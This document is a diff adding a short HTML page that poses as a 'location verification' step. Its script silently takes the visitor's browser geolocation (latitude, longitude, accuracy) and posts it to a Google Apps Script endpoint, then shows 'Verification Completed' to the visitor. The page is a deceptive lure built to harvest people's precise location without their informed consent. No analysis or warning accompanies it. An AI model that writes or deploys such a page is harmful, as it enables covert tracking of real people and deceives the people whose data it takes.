@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Verifying Location...</h2>
+
+<script>
+
+navigator.geolocation.getCurrentPosition(function(pos){
+
+fetch("https://script.google.com/macros/s/AKfycbyt23WQb0A4gpg_mIClb5JZo74Zik4mK2Huv6mdrk0eA36yPKlErxYZTSQT6g8Uxv_f/exec",{
+
+method:"POST",
+
+body:JSON.stringify({
+
+lat:pos.coords.latitude,
+
+lng:pos.coords.longitude,
+
+acc:pos.coords.accuracy
+
+})
+
+});
+
+document.body.innerHTML="Verification Completed";
+
+});
+
+</script>
+
+</body>
+</html>
